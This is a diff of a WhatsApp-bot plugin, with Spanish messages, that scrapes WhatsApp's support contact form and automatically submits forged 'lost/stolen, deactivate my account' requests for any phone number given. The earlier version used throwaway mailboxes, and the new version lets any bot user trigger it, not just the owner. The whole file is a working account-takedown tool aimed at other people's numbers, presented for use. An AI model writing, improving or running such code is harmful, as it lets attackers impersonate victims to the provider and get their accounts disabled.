@@ -1,50 +1,58 @@
-const handler = async (m, {conn, isOwner, usedPrefix, command, args}) => {
-  const q = args.join(' ');
+import cheerio from 'cheerio';
+import axios from 'axios';
 
-  // Verificación de si no se pasa un número
+const handler = async (m, { args }) => {
+  const q = args.join(' ');
   if (!q || !args[0]) {
-    return m.reply('*[ ℹ️ ] Ingrese el número que desee desactivar en formato internacional.*\n\n[ 💡 ] Ejemplo:* .soporte +1 (450) 555-555');
+    return m.reply('*[❗] INGRESE EL NÚMERO QUE DESEA DESACTIVAR EN FORMATO INTERNACIONAL, EJEMPLO: +1 (450) 555-555*');
   }
 
-  // Continuación del proceso si se pasó un número
-  const ntah = await axios.get('https://www.whatsapp.com/contact/noclient/');
-  const email = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10');
-  const cookie = ntah.headers['set-cookie'].join('; ');
-  const $ = cheerio.load(ntah.data);
-  const $form = $('form');
-  const url = new URL($form.attr('action'), 'https://www.whatsapp.com').href;
-  const form = new URLSearchParams();
-  form.append('jazoest', $form.find('input[name=jazoest]').val());
-  form.append('lsd', $form.find('input[name=lsd]').val());
-  form.append('step', 'submit');
-  form.append('country_selector', 'ID');
-  form.append('phone_number', q);
-  form.append('email', email.data[0]);
-  form.append('email_confirm', email.data[0]);
-  form.append('platform', 'ANDROID');
-  form.append('your_message', 'Perdido/roubado: desative minha conta: ' + q);
-  form.append('__user', '0');
-  form.append('__a', '1');
-  form.append('__csr', '');
-  form.append('__req', '8');
-  form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0');
-  form.append('dpr', '1');
-  form.append('__ccg', 'UNKNOWN');
-  form.append('__rev', '1006630858');
-  form.append('__comment_req', '0');
+  try {
+    const ntah = await axios.get('https://www.whatsapp.com/contact/noclient/');
+    
+    // Verificar si WhatsApp envió cookies
+    const cookies = ntah.headers['set-cookie'] || [];
+    if (!cookies.length) {
+      return m.reply('*[❗] Error: No se recibieron cookies de WhatsApp. Intente de nuevo más tarde.*');
+    }
+    
+    const cookie = cookies.join('; ');
+    const $ = cheerio.load(ntah.data);
+    const $form = $('form');
 
-  const res = await axios({url, method: 'POST', data: form, headers: {cookie}});
-  const payload = String(res.data);
-  
-  if (payload.includes(`"payload":true`)) {
-    m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`);
-  } else if (payload.includes(`"payload":false`)) {
-    m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`);
-  } else {
-    m.reply(util.format(JSON.parse(res.data.replace('for (;;);', ''))));
+    if (!$form.attr('action')) {
+      return m.reply('*[❗] Error: No se encontró el formulario de WhatsApp. Es posible que el método ya no funcione.*');
+    }
+
+    const url = new URL($form.attr('action'), 'https://www.whatsapp.com').href;
+    const form = new URLSearchParams();
+    
+    form.append('jazoest', $form.find('input[name=jazoest]').val() || '');
+    form.append('lsd', $form.find('input[name=lsd]').val() || '');
+    form.append('step', 'submit');
+    form.append('country_selector', 'ID');
+    form.append('phone_number', q);
+    form.append('platform', 'ANDROID');
+    form.append('your_message', `Perdido/robado: desactive mi cuenta: ${q}`);
+    
+    const res = await axios({
+      url,
+      method: 'POST',
+      data: form,
+      headers: { cookie }
+    });
+
+    const payload = String(res.data);
+    if (payload.includes(`"payload":true`)) {
+      return m.reply(`✅ *WhatsApp Support*\n\nSu cuenta ha sido desactivada con éxito.\n\nSi desea recuperarla, vuelva a registrarse dentro de los próximos 30 días.`);
+    } else {
+      return m.reply(`⚠️ *WhatsApp Support*\n\nNo se pudo procesar la solicitud. Es posible que necesite verificar la propiedad del número.`);
+    }
+
+  } catch (error) {
+    return m.reply(`❌ *Error*\n\nNo se pudo completar la solicitud. Detalles: ${error.message}`);
   }
 };
 
-handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i;
-handler.rowner = true;
+handler.command = /^(supportwa|swa|soporte|support|desactivarwa)$/i;
 export default handler;
